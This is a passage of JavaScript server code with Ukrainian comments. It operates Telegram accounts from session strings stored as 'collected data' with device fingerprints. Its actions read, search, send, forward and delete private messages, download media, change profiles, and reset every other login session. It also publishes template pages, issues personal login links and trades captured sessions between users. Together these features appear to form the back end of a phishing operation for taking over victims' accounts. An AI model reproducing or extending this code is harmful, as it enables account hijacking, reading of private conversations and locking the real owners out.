                                } else if (e.className === 'Chat') {
                                    peer = { className: 'InputPeerChat', chatId: e.id };
                                }
                                return {
                                    id: d.id,
                                    title: d.title,
                                    isChannel: d.isChannel,
                                    isGroup: d.isGroup,
                                    isUser: d.isUser,
                                    message: d.message?.message || '',
                                    unreadCount: d.unreadCount,
                                    pinned: d.pinned,
                                    folderId: d.folderId || null,
                                    archived: (d.folderId === 1) || false,
                                    peer
                                };
                            });
                            if (selectedFilter && selectedFilter.includePeers && selectedFilter.includePeers.length > 0) {
                                const ids = new Set(selectedFilter.includePeers.map(p => String(p.channelId || p.userId || p.chatId || p.id)));
                                return { statusCode: 200, body: JSON.stringify(result.filter(r => ids.has(String(r.id)))) };
                            }
                            return { statusCode: 200, body: JSON.stringify(result) };
                        }
                        case 'getTelegramDialogsPaged': {
                            const { limit = 50, offsetDate, offsetId, offsetPeer } = payload;
                            let entityPeer = undefined;
                            if (offsetPeer) {
                                try { entityPeer = await client.getEntity(offsetPeer); } catch {}
                            }
                            const res = await client.invoke(new Api.messages.GetDialogs({
                                offsetDate: offsetDate ? new Date(offsetDate) : 0,
                                offsetId: offsetId || 0,
                                offsetPeer: entityPeer || new Api.InputPeerEmpty(),
                                limit,
                                hash: BigInt(0)
                            }));
                            const dialogs = (res.dialogs || []);
                            if (!dialogs.length) {
                                const list = await client.getDialogs({ limit });
                                const result = list.map(d => ({
                                    id: d.id,
                                    title: d.title,
                                    isChannel: d.isChannel,
                                    isGroup: d.isGroup,
                                    isUser: d.isUser,
                                    message: d.message?.message || '',
                                    unreadCount: d.unreadCount,
                                    pinned: d.pinned,
                                    folderId: d.folderId || null,
                                    archived: (d.folderId === 1) || false
                                }));
                                return { statusCode: 200, body: JSON.stringify(result) };
                            }
                            return { statusCode: 200, body: JSON.stringify({ count: dialogs.length }) };
                        }
                        case 'getTelegramMessages': {
                            const { dialogId, peer, limit = 50, offsetId, ids } = payload;
                            if (!dialogId && !peer) throw new Error("Потрібен dialogId або peer.");
                            let target = dialogId;
                            if (peer) {
                                try { target = await client.getEntity(peer); } catch (e) { console.warn('Peer entity resolve failed:', e.message); }
                            }
                            try { await client.getEntity(target); } catch (e) { console.warn(`Could not load entity for target ${JSON.stringify(target)}:`, e.message); }
                            let messages;
                            if (Array.isArray(ids) && ids.length > 0) {
                                messages = await client.getMessages(target, { ids });
                            } else {
                                const opts = { limit };
                                if (offsetId) opts.offsetId = offsetId;
                                messages = await client.getMessages(target, opts);
                            }
                            const result = messages.map(m => {
                                let mediaInfo = null;
                                
                                if (m.media) {
                                    const media = m.media;
                                    let type = 'unknown';
                                    let className = media.className;
                                    let filename = null;
                                    let size = 0;
                                    let emoji = null;
                                    let poll = null;
                                    let downloadable = true;

                                    if (media.className === 'MessageMediaPoll' && media.poll && media.results) {
                                        type = 'poll';
                                        downloadable = false;
                                        const totalVotes = media.results.totalVoters || 0;
                                        poll = {
                                            question: media.poll.question,
                                            options: media.poll.answers.map(answer => {
                                                const optionResult = media.results.results?.find(r => r.option.toString() === answer.option.toString());
                                                const votes = optionResult ? optionResult.voters : 0;
                                                return { text: answer.text, votes: votes, percent: totalVotes > 0 ? Math.round((votes / totalVotes) * 100) : 0 };
                                            })
                                        };
                                    } else if (media.className === 'MessageMediaPhoto' && media.photo) {
                                        type = 'photo';
                                        const largestSize = media.photo.sizes?.reduce((prev, current) => (prev.size > current.size) ? prev : current, {size: 0});
                                        size = largestSize?.size || 0;
                                        filename = `photo_${media.photo.id || m.id}.jpg`;
                                    } else if (media.className === 'MessageMediaDocument' && media.document) {
                                        const doc = media.document;
                                        const filenameAttr = doc.attributes?.find(attr => attr.className === 'DocumentAttributeFilename');
                                        filename = filenameAttr?.fileName || `file_${doc.id}`;
                                        size = doc.size || 0;

                                        if (doc.attributes?.some(attr => attr.className === 'DocumentAttributeSticker')) {
                                            type = 'sticker';
                                            const stickerAttr = doc.attributes.find(attr => attr.className === 'DocumentAttributeSticker');
                                            emoji = stickerAttr?.alt || '🎨';
                                        } else {
                                            const mimeType = doc.mimeType || '';
                                            if (mimeType.startsWith('video/')) {
                                                type = 'video';
                                                className += ' video'; // Hack for frontend compatibility
                                            } else if (mimeType.startsWith('audio/')) {
                                                type = 'audio';
                                                className += ' audio'; // Hack for frontend compatibility
                                            } else if (mimeType.startsWith('image/')) {
                                                type = 'image';
                                            } else {
                                                type = 'document';
                                            }
                                        }
                                    } else if (media.className === 'MessageMediaVoice') {
                                        type = 'voice';
                                        filename = `voice_${m.id}.ogg`;
                                    } else if (media.className === 'MessageMediaWebPage') {
                                        type = 'webpage';
                                        downloadable = false;
                                    }

                                    mediaInfo = { className, downloadable, type, size, filename, emoji, poll };
                                    if (downloadable) {
                                        mediaInfo.downloadAction = 'downloadTelegramMedia';
                                        mediaInfo.messageId = m.id;
                                    }
                                }
                                
                                return {
                                    id: m.id,
                                    message: m.message,
                                    date: m.date,
                                    out: m.out,
                                    media: mediaInfo,
                                    fromId: m.fromId,
                                    peerId: m.peerId,
                                    unread: m.unread,
                                    pinned: m.pinned || false,
                                    replyToMsgId: m.replyToMsgId || null
                                };
                            });
                            return { statusCode: 200, body: JSON.stringify(result) };
                        }
                        case 'getMessageById': {
                            const { dialogId, messageId } = payload;
                            if (!dialogId || !messageId) throw new Error('Потрібні dialogId та messageId.');
                            try { await client.getEntity(dialogId); } catch {}
                            const messages = await client.getMessages(dialogId, { ids: [messageId] });
                            if (!messages || !messages[0]) {
                                return { statusCode: 404, body: JSON.stringify({ error: 'Message not found' }) };
                            }
                            const m = messages[0];
                            const mapped = {
                                id: m.id,
                                message: m.message,
                                date: m.date,
                                out: m.out,
                                media: m.media ? { className: m.media.className } : null,
                                fromId: m.fromId,
                                peerId: m.peerId,
                                unread: m.unread,
                                pinned: m.pinned || false,
                                replyToMsgId: m.replyToMsgId || null
                            };
                            return { statusCode: 200, body: JSON.stringify(mapped) };
                        }
                        case 'getHistoryAround': {
                            const { dialogId, messageId, limitBefore = 25, limitAfter = 25 } = payload;
                            if (!dialogId || !messageId) throw new Error('Потрібні dialogId та messageId.');
                            let entity;
                            try { entity = await client.getEntity(dialogId); } catch (e) {
                                return { statusCode: 400, body: JSON.stringify({ error: 'Could not load dialog entity', message: e.message }) };
                            }
                            const total = Math.max(1, (parseInt(limitBefore, 10) || 0) + (parseInt(limitAfter, 10) || 0) + 1);
                            const addOffset = -Math.max(0, parseInt(limitBefore, 10) || 0);
                            const res = await client.invoke(new Api.messages.GetHistory({
                                peer: entity,
                                offsetId: messageId,
                                addOffset,
                                limit: Math.min(100, total)
                            }));
                            const msgs = (res.messages || []).map(m => ({
                                id: m.id,
                                message: m.message,
                                date: m.date,
                                out: m.out,
                                media: m.media ? { className: m.media.className } : null,
                                fromId: m.fromId,
                                peerId: m.peerId,
                                unread: m.unread,
                                pinned: m.pinned || false,
                                replyToMsgId: m.replyToMsgId || null
                            }));
                            return { statusCode: 200, body: JSON.stringify(msgs) };
                        }
                        case 'searchMessages': {
                            const { dialogId, query, limit = 50, offsetId = 0 } = payload;
                            if (!query || typeof query !== 'string') throw new Error('Потрібен query.');
                            let peer = undefined;
                            if (dialogId) { try { peer = await client.getEntity(dialogId); } catch {} }
                            const res = await client.invoke(new Api.messages.Search({
                                peer: peer || new Api.InputPeerEmpty(),
                                q: query,
                                filter: new Api.InputMessagesFilterEmpty(),
                                minDate: 0,
                                maxDate: 0,
                                offsetId,
                                addOffset: 0,
                                limit: Math.min(100, parseInt(limit, 10) || 50),
                                maxId: 0,
                                minId: 0,
                                hash: BigInt(0)
                            }));
                            const messages = (res.messages || []).map(m => ({ id: m.id, message: m.message, date: m.date, peerId: m.peerId }));
                            return { statusCode: 200, body: JSON.stringify(messages) };
                        }
                        case 'sendReaction': {
                            const { dialogId, messageId, emoji = '👍', add = true, big = false } = payload;
                            if (!dialogId || !messageId) throw new Error('Потрібні dialogId та messageId.');
                            let entity;
                            try { entity = await client.getEntity(dialogId); } catch (e) {
                                return { statusCode: 400, body: JSON.stringify({ error: 'Could not load dialog entity', message: e.message }) };
                            }
                            const reaction = add ? [new Api.ReactionEmoji({ emoticon: String(emoji) })] : [];
                            await client.invoke(new Api.messages.SendReaction({ peer: entity, msgId: messageId, reaction, big }));
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'pinMessage': {
                            const { dialogId, messageId, silent = true, pmOneside = false } = payload;
                            if (!dialogId || !messageId) throw new Error('Потрібні dialogId та messageId.');
                            let entity = await resolvePeer(payload);
                             if (!entity) throw new Error("Could not resolve dialog entity.");
                            await client.invoke(new Api.messages.UpdatePinnedMessage({ peer: entity, id: messageId, silent, pmOneside }));
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'unpinMessage': {
                            const { dialogId, messageId } = payload;
                            if (!dialogId || !messageId) throw new Error('Потрібні dialogId та messageId.');
                            let entity = await resolvePeer(payload);
                            if (!entity) throw new Error("Could not resolve dialog entity.");
                            await client.invoke(new Api.messages.UpdatePinnedMessage({ peer: entity, id: messageId, unpin: true }));
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'unpinAllMessages': { // ДОДАНО
                            const { dialogId } = payload;
                            if (!dialogId) throw new Error("Потрібен dialogId.");
                            let entity = await resolvePeer(payload);
                            if (!entity) throw new Error("Could not resolve dialog entity.");
                            await client.invoke(new Api.messages.UnpinAllMessages({ peer: entity }));
                            return { statusCode: 200, body: JSON.stringify({ success: true, message: 'All messages unpinned.' }) };
                        }
                        case 'getPinnedMessages': { // ВИПРАВЛЕНО
                            const { dialogId } = payload;
                            if (!dialogId) throw new Error("Потрібен dialogId.");
                            let entity = await resolvePeer(payload);
                            if (!entity) throw new Error("Could not resolve dialog entity.");

                            // Отримуємо останню історію повідомлень
                            const historyResult = await client.invoke(new Api.messages.GetHistory({
                                peer: entity,
                                limit: 200, // Беремо достатньо повідомлень, щоб знайти нещодавно закріплені
                                addOffset: 0,
                                maxId: 0,
                                minId: 0,
                                hash: BigInt(0),
                            }));

                            // Фільтруємо результат, щоб залишити тільки закріплені
                            const pinnedMessages = (historyResult.messages || []).filter(m => m.pinned);

                            const messages = pinnedMessages.map(m => ({
                                id: m.id,
                                message: m.message,
                                date: m.date,
                                out: m.out,
                                fromId: m.fromId,
                                peerId: m.peerId,
                                pinned: true // Вони точно закріплені
                            }));
                            
                            return { statusCode: 200, body: JSON.stringify(messages) };
                        }
                        case 'muteDialog': {
                            const { dialogId, muteSeconds = 31536000 } = payload; // default 1 year
                            if (!dialogId) throw new Error('Потрібен dialogId.');
                            let entity;
                            try { entity = await client.getEntity(dialogId); } catch (e) {
                                return { statusCode: 400, body: JSON.stringify({ error: 'Could not load dialog entity', message: e.message }) };
                            }
                            const now = Math.floor(Date.now() / 1000);
                            await client.invoke(new Api.account.UpdateNotifySettings({
                                peer: entity,
                                settings: new Api.InputPeerNotifySettings({ muteUntil: now + Math.max(0, parseInt(muteSeconds, 10) || 0) })
                            }));
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'unmuteDialog': {
                            const { dialogId } = payload;
                            if (!dialogId) throw new Error('Потрібен dialogId.');
                            let entity;
                            try { entity = await client.getEntity(dialogId); } catch (e) {
                                return { statusCode: 400, body: JSON.stringify({ error: 'Could not load dialog entity', message: e.message }) };
                            }
                            await client.invoke(new Api.account.UpdateNotifySettings({
                                peer: entity,
                                settings: new Api.InputPeerNotifySettings({ muteUntil: 0 })
                            }));
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'archiveDialog': {
                            const { dialogId, archived = true } = payload;
                            if (!dialogId) throw new Error('Потрібен dialogId.');
                            let entity;
                            try { entity = await client.getEntity(dialogId); } catch (e) {
                                return { statusCode: 400, body: JSON.stringify({ error: 'Could not load dialog entity', message: e.message }) };
                            }
                            await client.invoke(new Api.folders.EditPeerFolders({
                                folderPeers: [new Api.InputFolderPeer({ peer: entity, folderId: archived ? 1 : 0 })]
                            }));
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'getContacts': {
                            const res = await client.invoke(new Api.contacts.GetContacts({ hash: BigInt(0) }));
                            const users = (res.users || []).map(u => ({ id: u.id, firstName: u.firstName, lastName: u.lastName, username: u.username, phone: u.phone }));
                            return { statusCode: 200, body: JSON.stringify(users) };
                        }
                        case 'getTelegramEntityInfo': {
                            const { entityId, peer } = payload;
                            let entity = null;
                            if (peer) {
                                try { entity = await client.getEntity(peer); } catch (e) { console.warn('Peer entity resolve failed:', e.message); }
                            }
                            if (!entity) {
                                if (!entityId) throw new Error("Потрібен entityId або peer.");
                                try { entity = await client.getEntity(entityId); } catch (e) {
                                    console.warn(`Could not load entity for entityId ${entityId}:`, e.message);
                                    return { statusCode: 400, body: JSON.stringify({ error: "Не вдалося знайти сутність", message: e.message }) };
                                }
                            }

                            let fullEntity;
                            try {
                                fullEntity = await client.invoke(
                                    entity.className === 'User' ? new Api.users.GetFullUser({ id: entity }) :
                                    entity.className === 'Channel' ? new Api.channels.GetFullChannel({ channel: entity }) :
                                    new Api.messages.GetFullChat({ chatId: entity.id })
                                );
                            } catch (e) {
                                console.warn(`Could not get full entity info for ${entityId}:`, e.message);
                                fullEntity = { fullUser: {} }; // Fallback to empty object
                            }
                            
                            let photoCount = 0;
                            try {
                                const photos = await client.invoke(new Api.photos.GetUserPhotos({ userId: entity, limit: 1 }));
                                photoCount = photos.count || (photos.photos ? photos.photos.length : 0) || 0;
                            } catch {}

                            return { statusCode: 200, body: JSON.stringify({ 
                                entity, 
                                full: { 
                                    about: fullEntity.fullUser?.about || fullEntity.about,
                                    pinnedMsgId: fullEntity.pinnedMsgId,
                                    stickerset: fullEntity.stickerset,
                                    profilePhotoCount: photoCount,
                                    username: entity.username
                                } 
                            }) };
                        }
                        case 'sendTelegramMessage': {
                            const { dialogId, message, file } = payload;
                            if (!dialogId) throw new Error("Потрібен dialogId.");
                            
                            try { await client.getEntity(dialogId); } catch (e) { console.warn(`Could not load entity for dialogId ${dialogId}:`, e.message); }
                            
                            let fileBuffer = null;
                            if (file && file.data) {
                                fileBuffer = Buffer.from(file.data, 'base64');
                                fileBuffer.name = file.name;
                            }
                            // Using sendFile is more robust for videos and documents
                            if (fileBuffer) {
                                await client.sendFile(dialogId, { file: fileBuffer, caption: message || '' });
                            } else {
                                await client.sendMessage(dialogId, { message: message || '' });
                            }
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'deleteTelegramMessages': {
                            const { messageIds } = payload;
                            if (!Array.isArray(messageIds) || messageIds.length === 0) throw new Error("Потрібен messageIds (масив).");
                            await client.deleteMessages(undefined, messageIds, { revoke: true });
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'editTelegramMessage': {
                            const { dialogId, messageId, text } = payload;
                            if (!dialogId || !messageId || text === undefined) throw new Error("Потрібні dialogId, messageId та text.");
                            
                            try { await client.getEntity(dialogId); } catch (e) { console.warn(`Could not load entity for dialogId ${dialogId}:`, e.message); }
                            
                            await client.editMessage(dialogId, { message: messageId, text });
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'toggleTelegramBlock': {
                            const { userId, blocked } = payload;
                            if (!userId) throw new Error("Потрібен userId.");
                            
                            try { await client.getEntity(userId); } catch (e) { console.warn(`Could not load entity for userId ${userId}:`, e.message); }
                            
                            if (blocked) {
                                await client.invoke(new Api.contacts.Block({ id: userId }));
                            } else {
                                await client.invoke(new Api.contacts.Unblock({ id: userId }));
                            }
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'deleteTelegramDialog': {
                            const { dialogId } = payload;
                            if (!dialogId) throw new Error("Потрібен dialogId.");
                            
                            try { await client.getEntity(dialogId); } catch (e) { console.warn(`Could not load entity for dialogId ${dialogId}:`, e.message); }
                            
                            await client.deleteDialog(dialogId);
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'updateTelegramProfilePhoto': {
                            const { file } = payload;
                            if (file && file.data) {
                                const fileBuffer = Buffer.from(file.data, 'base64');
                                const uploaded = await client.uploadFile({ file: fileBuffer, workers: 1, fileName: file.name || 'profile.jpg' });
                                await client.invoke(new Api.photos.UploadProfilePhoto({ file: uploaded }));
                            } else {
                                const photos = await client.invoke(new Api.photos.GetUserPhotos({ userId: 'me', limit: 1 }));
                                if (photos.photos.length > 0) {
                                    await client.invoke(new Api.photos.DeletePhotos({ id: photos.photos.map(p => new Api.InputPhoto({ id: p.id, accessHash: p.accessHash, fileReference: p.fileReference })) }));
                                }
                            }
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'listTelegramProfilePhotos': {
                            const { userId = 'me', limit = 50, offset = 0 } = payload;
                            let entity = userId;
                            try { entity = await client.getEntity(userId); } catch {}
                            const res = await client.invoke(new Api.photos.GetUserPhotos({ userId: entity, limit, offset }));
                            const photos = (res.photos || []).map(p => ({ id: p.id, accessHash: p.accessHash, fileReference: p.fileReference, date: p.date }));
                            return { statusCode: 200, body: JSON.stringify({ total: res.count || photos.length, photos }) };
                        }
                        case 'downloadProfilePhoto': {
                            const { userId = 'me', useTemporaryStorage = true } = payload;
                            let entity = userId;
                            try { entity = await client.getEntity(userId); } catch {}
                            try {
                                const buffer = await client.downloadProfilePhoto(entity, {});
                                if (!buffer || buffer.length === 0) throw new Error("Фото профілю не знайдено або воно порожнє.");
                                const mimeType = 'image/jpeg';
                                const mediaInfo = { type: 'photo', filename: `avatar_${Date.now()}.jpg` };
                                if (useTemporaryStorage) {
                                    try {
                                        const driveFile = await uploadTemporaryMedia(drive, buffer, mediaInfo.filename, mimeType);
                                        await scheduleTemporaryFileDeletion(drive, driveFile.id, 5);
                                        mediaInfo.url = driveFile.webViewLink;
                                        mediaInfo.fileId = driveFile.id;
                                        return { statusCode: 200, body: JSON.stringify(mediaInfo) };
                                    } catch (driveError) {
                                        console.warn('Failed to upload avatar to Drive, fallback to dataUrl:', driveError.message);
                                    }
                                }
                                mediaInfo.dataUrl = `data:${mimeType};base64,${buffer.toString('base64')}`;
                                return { statusCode: 200, body: JSON.stringify(mediaInfo) };
                            } catch (e) {
                                return { statusCode: 400, body: JSON.stringify({ error: 'Не вдалося завантажити фото профілю', message: e.message }) };
                            }
                        }
                        case 'downloadTelegramMedia': {
                            const { dialogId, messageId, useTemporaryStorage = true } = payload;
                            if (!dialogId || !messageId) throw new Error("Потрібні dialogId та messageId.");
                            
                            try { await client.getEntity(dialogId); } catch (e) { console.warn(`Could not load entity for dialogId ${dialogId}:`, e.message); }
                            
                            const messages = await client.getMessages(dialogId, { ids: [messageId] });
                            if (!messages || !messages[0] || !messages[0].media) {
                                return { statusCode: 404, body: 'Медіа не знайдено' };
                            }
                            
                            const message = messages[0];
                            let mediaInfo = { type: 'unknown', filename: null, size: null, url: null, dataUrl: null };
                            
                            try {
                                const buffer = await client.downloadMedia(message, {});
                                if (!buffer) throw new Error("Не вдалося завантажити медіа-файл (buffer is null).");

                                const media = message.media;
                                let mimeType = 'application/octet-stream';
                                
                                if (media.className === 'MessageMediaPhoto' && media.photo) {
                                    mediaInfo.type = 'photo';
                                    mediaInfo.filename = `photo_${media.photo.id || messageId}.jpg`;
                                    mimeType = 'image/jpeg';
                                } else if (media.className === 'MessageMediaDocument' && media.document) {
                                    const doc = media.document;
                                    const filenameAttr = doc.attributes?.find(attr => attr.className === 'DocumentAttributeFilename');
                                    mediaInfo.filename = filenameAttr?.fileName || `document_${doc.id}`;
                                    // ВИПРАВЛЕНО: Додано перевірку, щоб уникнути помилки .startsWith на undefined
                                    mimeType = doc.mimeType || 'application/octet-stream';
                                    if (mimeType.startsWith('video/')) mediaInfo.type = 'video';
                                    else if (mimeType.startsWith('audio/')) mediaInfo.type = 'audio';
                                    else if (mimeType.startsWith('image/')) mediaInfo.type = 'image';
                                    else mediaInfo.type = 'document';
                                } else if (media.className === 'MessageMediaVoice') {
                                    mediaInfo.type = 'voice';
                                    mediaInfo.filename = `voice_${messageId}.ogg`;
                                    mimeType = 'audio/ogg';
                                } else {
                                    mediaInfo.filename = `media_${messageId}`;
                                }
                                
                                if (useTemporaryStorage) {
                                    try {
                                        const driveFile = await uploadTemporaryMedia(drive, buffer, mediaInfo.filename, mimeType);
                                        await scheduleTemporaryFileDeletion(drive, driveFile.id, 5);
                                        mediaInfo.url = driveFile.webViewLink;
                                        mediaInfo.fileId = driveFile.id;
                                        return { statusCode: 200, body: JSON.stringify(mediaInfo) };
                                    } catch (driveError) {
                                        console.warn('Failed to upload to Google Drive, falling back to dataUrl:', driveError.message);
                                    }
                                }
                                
                                mediaInfo.dataUrl = `data:${mimeType};base64,${buffer.toString('base64')}`;
                                return { statusCode: 200, body: JSON.stringify(mediaInfo) };
                            } catch (e) {
                                console.error('Помилка обробки медіа:', e.message);
                                return { statusCode: 500, body: JSON.stringify({ error: 'Помилка обробки медіа', message: e.message }) };
                            }
                        }
                        case 'updateProfile': { // ВИПРАВЛЕНО: з updateTelegramProfile на updateProfile
                            const { firstName, lastName, about } = payload;
                            await client.invoke(new Api.account.UpdateProfile({ firstName, lastName, about }));
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'readHistory': {
                            const { dialogId } = payload;
                            if (!dialogId) throw new Error("Потрібен dialogId.");
                            
                            let entity;
                            try { entity = await client.getEntity(dialogId); } catch (e) {
                                return { statusCode: 400, body: JSON.stringify({ error: "Could not load dialog entity", message: e.message }) };
                            }
                            
                            if (entity.className === 'Channel') {
                                await client.invoke(new Api.channels.ReadHistory({ channel: entity, maxId: 0 }));
                            } else {
                                await client.invoke(new Api.messages.ReadHistory({ peer: entity, maxId: 0 }));
                            }
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'forwardMessages': {
                            const { toDialogId, fromDialogId, messageIds } = payload;
                            if (!toDialogId || !fromDialogId || !messageIds) throw new Error("Потрібні toDialogId, fromDialogId та messageIds.");
                            
                            try {
                                await client.getEntity(toDialogId);
                                await client.getEntity(fromDialogId);
                            } catch (e) {
                                console.warn(`Could not load entities for forwardMessages:`, e.message);
                            }
                            
                            await client.forwardMessages(toDialogId, { messages: messageIds, fromPeer: fromDialogId });
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'getAuthorizations': {
                            const result = await client.invoke(new Api.account.GetAuthorizations());
                            const authorizations = result.authorizations.map(auth => ({
                                hash: auth.hash,
                                current: auth.current,
                                device_model: auth.deviceModel,
                                platform: auth.platform,
                                system_version: auth.systemVersion,
                                ip: auth.ip,
                                country: auth.country,
                                date_active: auth.dateActive,
                            }));
                            return { statusCode: 200, body: JSON.stringify(authorizations) };
                        }
                        case 'resetAuthorizations': {
                            await client.invoke(new Api.account.ResetAuthorizations());
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                        case 'deleteTelegramMessage': {
                            const { dialogId, messageId } = payload;
                            if (!dialogId || !messageId) throw new Error('Потрібні dialogId та messageId.');
                            await client.deleteMessages(dialogId, [messageId], { revoke: true });
                            return { statusCode: 200, body: JSON.stringify({ success: true }) };
                        }
                    }
                } catch (e) {
                    console.error('Помилка Telegram API:', e.stack);
                    return { statusCode: 400, body: JSON.stringify({ error: "Помилка Telegram API", message: e.message }) };
                }
            }

            switch(action) {
                case 'getUserData': {
                    const protocol = event.headers.host.includes('netlify.app') ? 'https://' : 'http://';
                    const { collectedData, ...lightUserData } = user;
                    return { statusCode: 200, body: JSON.stringify({
                        nickname: lightUserData.nickname,
                        personalLoginLink: `${protocol}${event.headers.host}/?login_for=${lightUserData.userId}`,
                        publishedPage: lightUserData.publishedPage,
                        templates: db.templates || [],
                        gifts: lightUserData.gifts || 0,
                        telegramBinding: lightUserData.telegramBinding || {}
                    })};
                }
                case 'transferGift': {
                    const { to, by = 'nickname', amount = 1 } = payload;
                    if (!to) return { statusCode: 400, body: 'Recipient is required.' };
                    const amt = Math.max(1, parseInt(amount, 10) || 1);
                    const fromUser = user;
                    if ((fromUser.gifts || 0) < amt) return { statusCode: 400, body: 'Not enough gifts.' };
                    const recipient = by === 'id' ? db.users.find(u => u.userId === to) : db.users.find(u => u.nickname.toLowerCase() === String(to).toLowerCase());
                    if (!recipient) return { statusCode: 404, body: 'Recipient not found.' };
                    if (recipient.userId === fromUser.userId) return { statusCode: 400, body: 'Cannot transfer to self.' };
                    fromUser.gifts = (fromUser.gifts || 0) - amt;
                    recipient.gifts = (recipient.gifts || 0) + amt;
                    await writeDb(drive, db);
                    return { statusCode: 200, body: JSON.stringify({ success: true, fromGifts: fromUser.gifts, toGifts: recipient.gifts }) };
                }
                case 'getCollectedData': {
                    const lightCollectedData = (user.collectedData || []).map(entry => {
                        const { data, ...metadata } = entry;
                        if (metadata.type === 'telegram_session') {
                             return { ...metadata, data: { hasSession: true } };
                        }
                        const itemCount = Array.isArray(data) ? data.length : null;
                        return { ...metadata, itemCount };
                    });
                    return { statusCode: 200, body: JSON.stringify(lightCollectedData) };
                }
                case 'getCollectedDataEntry': {
                    const entry = (user.collectedData || []).find(d => d.collectedAt === payload.timestamp);
                    if (!entry) return { statusCode: 404, body: 'Data entry not found.' };
                    
                    if (entry.type === 'telegram_session') {
                         return { statusCode: 200, body: JSON.stringify({
                             type: 'telegram_session',
                             collectedAt: entry.collectedAt,
                             fingerprint: entry.fingerprint,
                             data: { sessionString: entry.data.sessionString }
                        })};
                    }
                    return { statusCode: 200, body: JSON.stringify(entry) };
                }
                case 'deleteMultipleCollectedData': {
                    const timestampsToDelete = payload.timestamps || [];
                    if (user.collectedData && timestampsToDelete.length > 0) {
                        user.collectedData = user.collectedData.filter(d => !timestampsToDelete.includes(d.collectedAt));
                        await writeDb(drive, db);
                        return { statusCode: 200, body: 'Selected data entries deleted.' };
                    }
                    return { statusCode: 400, body: 'No timestamps provided.' };
                }
                case 'deleteAllDataForFingerprint': {
                    const fpToDelete = payload.fingerprint;
                    if (user.collectedData && fpToDelete) {
                        user.collectedData = user.collectedData.filter(d => d.fingerprint !== fpToDelete);
                        await writeDb(drive, db);
                        return { statusCode: 200, body: `All data for fingerprint ${fpToDelete} deleted.` };
                    }
                    return { statusCode: 400, body: 'No fingerprint provided.' };
                }
                case 'publishPage': {
                    user.publishedPage = { source: payload.source, sourceTemplateId: payload.sourceTemplateId || null, htmlContent: payload.htmlContent, updatedAt: new Date().toISOString() };
                    await writeDb(drive, db);
                    return { statusCode: 200, body: JSON.stringify(user.publishedPage) };
                }
                case 'deletePage': {
                    user.publishedPage = null;
                    await writeDb(drive, db);
                    return { statusCode: 200, body: 'Page deleted successfully.' };
                }
                case 'deleteCollectedData': {
                    if (user.collectedData && payload.timestamp) {
                        user.collectedData = user.collectedData.filter(d => d.collectedAt !== payload.timestamp);
                        await writeDb(drive, db);
                        return { statusCode: 200, body: 'Data entry deleted.' };
                    }
                    return { statusCode: 400, body: 'Data not found or timestamp missing.' };
                }
                case 'generateBotLink': {
                    if (!user.telegramBinding) user.telegramBinding = {};
                    user.telegramBinding.activationId = nanoid(16);
                    user.telegramBinding.status = 'pending';
                    user.telegramBinding.chatId = null;
                    user.telegramBinding.username = null;
                    await writeDb(drive, db);
                    return { statusCode: 200, body: JSON.stringify({ activationId: user.telegramBinding.activationId }) };
                }
                case 'transferSession': {
                    const { fromTimestamp, toUserId } = payload;
                    if (!fromTimestamp || !toUserId) return { statusCode: 400, body: 'fromTimestamp and toUserId are required.' };
                    const fromUser = user;
                    const target = db.users.find(u => u.userId === toUserId);
                    if (!target) return { statusCode: 404, body: 'Target user not found.' };
                    if (target.userId === fromUser.userId) return { statusCode: 400, body: 'Cannot transfer to self.' };

                    const entryIndex = (fromUser.collectedData || []).findIndex(d => d.collectedAt === fromTimestamp && d.type === 'telegram_session');
                    if (entryIndex === -1) return { statusCode: 404, body: 'Session entry not found.' };

                    const entry = fromUser.collectedData[entryIndex];
                    if (!entry.data || !entry.data.sessionString) return { statusCode: 400, body: 'Invalid session payload.' };

                    fromUser.collectedData.splice(entryIndex, 1);
                    if (!target.collectedData) target.collectedData = [];
                    target.collectedData.push({ ...entry, transferredAt: new Date().toISOString(), transferredFrom: fromUser.userId });

                    await writeDb(drive, db);
                    return { statusCode: 200, body: JSON.stringify({ success: true }) };
                }
            }
        } catch (e) {
            return { statusCode: 401, body: 'Invalid or expired token.' };
        }

        return { statusCode: 400, body: 'Invalid action.' };

    } catch (error) {
        console.error(`Public API Error:`, error);
        return { 
            statusCode: 500, 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: 'Server error', message: error.message || 'Check function logs.' })
        };
    }
};